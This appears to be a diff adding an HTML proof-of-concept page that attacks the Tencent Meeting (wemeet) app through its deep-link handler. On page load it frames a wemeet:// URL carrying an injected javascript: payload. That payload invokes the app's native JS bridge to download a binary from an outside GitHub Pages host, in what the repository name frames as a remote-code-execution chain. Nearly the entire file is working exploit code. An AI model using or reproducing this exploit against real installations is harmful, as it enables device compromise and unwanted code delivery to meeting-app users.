@@ -1,0 +1,22 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P28</h1>
+<script>
+document.title='P28L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var js="javascript:(function(){document.title='P28INJ:'+location.protocol+'//'+location.host+location.pathname.slice(0,48);window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P28CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,48)};function c(m,e,p){if(!window.JSCallJavaMgr){document.title='P28NOJSB:'+location.host;return}window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:m+'.'+e}))}setTimeout(function(){c('CommonPlugin','GetPerformance',{})},400);setTimeout(function(){c('CommonPlugin','DownloadFile',{url:'https://gitwhs.github.io/wm-poc-rce/p25.bin',fileName:'p28.bin'})},1400);setTimeout(function(){c('CommonPlugin','CheckJsApiConfig',{})},2400)})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){
+  frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P28L-OFFICIAL');
+}, 600);
+setTimeout(function(){
+  frame('wemeet://page/web_app?url='+encodeURIComponent(js),'P28L-JSINJ');
+}, 14000);
+setTimeout(function(){ document.title='P28L-DONE'; }, 22000);
+</script>
+</body></html>
